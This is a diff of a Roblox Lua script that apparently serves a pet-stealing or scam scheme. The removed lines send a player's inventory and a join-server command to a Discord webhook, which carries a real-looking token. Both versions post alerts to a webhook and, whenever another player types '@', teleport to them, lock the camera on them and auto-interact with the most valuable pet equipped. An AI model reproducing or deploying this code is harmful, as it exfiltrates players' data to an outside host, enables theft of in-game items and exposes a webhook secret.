@@ -5,10 +5,10 @@ local RunService = game:GetService("RunService")
 local Camera = workspace.CurrentCamera
 local UserInputService = game:GetService("UserInputService")
 
--- CONFIG (REPLACE WITH YOUR WEBHOOK)
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
+-- CONFIG (PUT YOUR WEBHOOK HERE)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
 
--- PET PRIORITY (HIGHEST TO LOWEST)
+-- PET PRIORITY (Highest to Lowest)
 local PET_PRIORITY = {
     ["T-Rex"] = 100,
     ["Dragonfly"] = 90,
@@ -26,56 +26,18 @@ local IGNORE_ITEMS = {
 }
 
 --[[ WEBHOOK FUNCTIONS ]]--
-local function sendWebhook(content, embed)
+local function sendWebhook(content)
     local payload = {
         content = content,
-        embeds = {embed}
+        embeds = {{
+            title = "Roqate - 2025",
+            description = "Player triggered the system",
+            color = 0xFF0000
+        }}
     }
-    
-    local success, response = pcall(function()
-        return HttpService:RequestAsync({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(payload)
-        })
+    pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
     end)
-    
-    if not success then
-        warn("Webhook failed: "..tostring(response))
-    end
-end
-
-local function sendInitialData()
-    local items = {}
-    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
-        table.insert(items, item.Name)
-    end
-
-    local hasRare = false
-    for pet in pairs(PET_PRIORITY) do
-        if table.find(items, pet) then
-            hasRare = true
-            break
-        end
-    end
-
-    local embed = {
-        title = "📦 "..LocalPlayer.Name.."'s Inventory",
-        description = table.concat(items, "\n"),
-        color = hasRare and 0xFF0000 or 0x00FF00,
-        fields = {
-            {
-                name = "JOIN SCRIPT", 
-                value = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', game.PlaceId, game.JobId),
-                inline = false
-            }
-        }
-    }
-
-    sendWebhook(hasRare and "@everyone" or nil, embed)
 end
 
 --[[ ITEM SYSTEM ]]--
@@ -111,43 +73,45 @@ local function getBestItem()
     return bestItem
 end
 
---[[ PRECISE INTERACTION ]]--
-local function findInteractPart(targetChar)
-    -- First check for ProximityPrompt
-    for _,part in pairs(targetChar:GetDescendants()) do
+--[[ PRECISE INTERACTION SYSTEM ]]--
+local function findInteractPart(character)
+    -- First check for ProximityPrompt (E to interact)
+    for _,part in pairs(character:GetDescendants()) do
         if part:IsA("ProximityPrompt") then
             return part.Parent, part
         end
     end
     
-    -- Fallback to torso if no prompt found
-    return targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
+    -- Fallback to humanoid root part
+    return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
 end
 
 local function getScreenPosition(part)
-    local vector, onScreen = Camera:WorldToViewportPoint(part.Position)
-    if onScreen then
-        return Vector2.new(vector.X, vector.Y)
-    end
-    return Vector2.new(0.5, 0.5) -- Fallback to center
+    local viewportPoint = Camera:WorldToViewportPoint(part.Position)
+    return Vector2.new(viewportPoint.X, viewportPoint.Y)
 end
 
---[[ TARGET INTERACTION ]]--
-local function interactWithPlayer(target)
-    -- Teleport to target
+--[[ TELEPORT AND INTERACT ]]--
+local function teleportAndInteract(target)
+    -- Get target character
     local targetChar = target.Character or target.CharacterAdded:Wait()
     local interactPart, prompt = findInteractPart(targetChar)
+    local head = targetChar:FindFirstChild("Head")
+
+    -- Teleport to target (4 studs away)
     LocalPlayer.Character.HumanoidRootPart.CFrame = interactPart.CFrame * CFrame.new(0, 0, -4)
 
-    -- Force first-person
+    -- Force first-person view
     LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
     LocalPlayer.CameraMaxZoomDistance = 0.5
     LocalPlayer.CameraMinZoomDistance = 0.5
 
-    -- Look at target
+    -- Look at target continuously
     local lookConn
     lookConn = RunService.Heartbeat:Connect(function()
-        Camera.CFrame = CFrame.new(Camera.CFrame.Position, interactPart.Position)
+        if head then
+            Camera.CFrame = CFrame.new(Camera.CFrame.Position, head.Position)
+        end
     end)
 
     -- Equip best item
@@ -156,10 +120,10 @@ local function interactWithPlayer(target)
         LocalPlayer.Character.Humanoid:EquipTool(item)
     end
 
-    -- Calculate screen position for interaction
+    -- Calculate exact click position
     local screenPos = getScreenPosition(interactPart)
     UserInputService:SetMouseLocation(screenPos.X, screenPos.Y)
-    
+
     -- Handle interaction
     if prompt then
         -- Use proximity prompt if available
@@ -187,24 +151,14 @@ local function onChatted(player, msg)
     if player == LocalPlayer then return end
     if not string.find(msg, "@") then return end
     
-    -- Send alert to webhook
-    local embed = {
-        title = "🎯 "..player.Name.." triggered",
-        color = 0xFFA500,
-        fields = {
-            {name = "User ID", value = player.UserId, inline = true},
-            {name = "Account Age", value = player.AccountAge, inline = true}
-        }
-    }
-    sendWebhook(nil, embed)
+    -- Send webhook alert
+    sendWebhook(player.Name.." triggered the system with @ mention")
     
-    -- Interact with player
-    interactWithPlayer(player)
+    -- Teleport and interact
+    teleportAndInteract(player)
 end
 
---[[ INITIALIZE ]]--
-sendInitialData() -- Send inventory immediately
-
+--[[ INITIALIZATION ]]--
 -- Set up chat listeners
 for _,player in pairs(Players:GetPlayers()) do
     if player ~= LocalPlayer then
